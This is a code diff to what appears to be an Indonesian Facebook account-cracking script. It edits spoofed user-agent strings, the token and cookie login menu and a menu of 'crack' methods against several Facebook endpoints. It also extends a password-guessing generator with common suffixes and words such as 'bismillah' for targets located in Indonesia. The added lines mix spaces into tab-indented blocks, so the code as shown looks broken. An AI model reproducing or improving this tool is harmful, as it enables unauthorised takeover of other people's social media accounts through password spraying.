@@ -70,12 +70,12 @@ def banner():
 \033[1;36m______________________________________________\033[1;37m""")
 
 ua ="Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
-ua2 ="Mozilla/5.0 (Linux; Android 5.0; ASUS ZenFone 2 Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
+ua2 ="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
 host="https://mbasic.facebook.com"
 ips=None
 try:
 	b=requests.get("http://ip-api.com/json/").json()["query"]
-	ips=requests.get("http://ip-api.com/json/"+b,headers={"Referer":"http://ip-api.com/","Content-Type":"application/json; charset=utf-8","User-Agent":"Mozilla/5.0 (Linux; Android 5.0; ASUS ZenFone 2 Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"}).json()["country"].lower()
+	ips=requests.get("http://ip-api.com/json/"+b,headers={"Referer":"http://ip-api.com/","Content-Type":"application/json; charset=utf-8","User-Agent":"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"}).json()["country"].lower()
 except:
 	ips=None
 
@@ -190,11 +190,11 @@ def logs():
   banner()
   print ("")
   print((p+" ["+o+"01"+h+"] Login Token"))
-  print((p+" ["+o+"02"+p+"] Login Cookies"))
-  print((p+" ["+o+"03"+p+"] Tonton Cara Ambil Token"))
-  print((p+" ["+o+"04"+p+"] Report Bug Tools"))
+  print((p+" ["+o+"02"+m+"] Login Cookies"))
+  print((p+" ["+o+"03"+u+"] Tonton Cara Ambil Token"))
+  print((p+" ["+o+"04"+k+"] Report Bug Tools"))
   print((p+" ["+o+"05"+p+"] Contact Author"))
-  print((p+" ["+o+"00"+p+"] Exit\n"))
+  print((p+" ["+o+"00"+m+"] Exit\n"))
   sek=input(p+" ["+k+"•"+m+"•"+p+"] Choose: ")
   if sek=="":
     print((p+" ["+k+"•"+m+"•"+p+"] Fill In The Correct"))
@@ -294,15 +294,15 @@ def choose_menu():
 
 def pilihcrack(file):
   print("\n\033[0;97m [ \033[1;36mSelect Methode Crack\033[1;37m ]")
-  print((p+" ["+o+"01"+p+"] Crack With Api.Facebook ("+o+"FASTSPAM"+p+")"))
-  print((p+" ["+o+"02"+p+"] Crack With Api.Facebook + TTL ("+o+"FAST"+p+")"))
-  print((p+" ["+o+"03"+p+"] Crack With Mbasic.Faceboo ("+o+"SLOW"+p+")"))
-  print((p+" ["+o+"04"+h+"] Crack With Mbasic.Facebook + TTL ("+o+"RECOMENDASI"+p+")"))
+  print((p+" ["+o+"01"+m+"] Crack With Api.Facebook ("+o+"FASTSPAM"+p+")"))
+  print((p+" ["+o+"02"+u+"] Crack With Api.Facebook + TTL ("+o+"FAST"+p+")"))
+  print((p+" ["+o+"03"+h+"] Crack With Mbasic.Faceboo ("+o+"SLOW"+p+")"))
+  print((p+" ["+o+"04"+k+"] Crack With Mbasic.Facebook + TTL ("+o+"slow"+p+")"))
   print((p+" ["+o+"05"+p+"] Crack With Touch.Facebook ("+o+"SLOW"+p+")"))
   print((p+" ["+o+"06"+p+"] Crack With Touch.Facebook + TTL ("+o+"SLOW"+p+")"))
   print((p+" ["+o+"07"+p+"] Crack With M.Facebook ("+o+"SLOW"+p+")"))
   print((p+" ["+o+"08"+p+"] Crack With M.Facebook + TTL ("+o+"SLOW"+p+")"))
-  print((p+" ["+o+"09"+p+"] Crack With Free.Facebook ("+o+"SLOW"+p+")"))
+  print((p+" ["+o+"09"+h+"] Crack With Free.Facebook ("+o+"SLOW"+p+")"))
   print((p+" ["+o+"10"+p+"] Crack With Free.Facebook + TTL ("+o+"SLOW"+p+")"))
   print((p+" ["+o+"00"+p+"] Back To Menu "))
   krah=input(p+"\n ["+k+"•"+m+"•"+p+"] Choose : ")
@@ -503,13 +503,16 @@ def generate(text):
 			if len(i)==3 or len(i)==4 or len(i)==5:
 				results.append(i+"123")
 				results.append(i+"12345")
+                                results.append(i+"123456")
 			else:
 				results.append(i+"123")
 				results.append(i+"12345")
+                                results.append(i+"123456")
 				results.append(i)
 				if "indonesia" in ips:
 					results.append("sayang")
 					results.append("anjing")
+                                        results.append("bismillah")
 					results.append("bajingan")
 					results.append("bangsat")
 	return results
